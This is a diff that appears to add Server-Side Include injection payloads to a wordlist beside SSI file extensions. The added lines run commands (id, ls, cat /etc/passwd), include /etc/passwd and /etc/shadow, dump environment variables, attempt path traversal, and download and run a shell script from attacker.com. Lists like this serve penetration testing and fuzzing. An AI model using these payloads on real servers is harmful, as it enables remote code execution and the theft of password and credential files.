@@ -42,3 +42,11 @@
 .stm
 .shtm
 .sht
+<!--#exec cmd="id"-->
+<!--#exec cmd="cat /etc/passwd"-->
+<!--#exec cmd="ls -la"-->
+<!--#include file="/etc/passwd"-->
+<!--#include virtual="/etc/shadow"-->
+<!--#printenv-->
+<!--#exec cmd="wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s"-->
+<!--#include file="../../../etc/passwd"-->
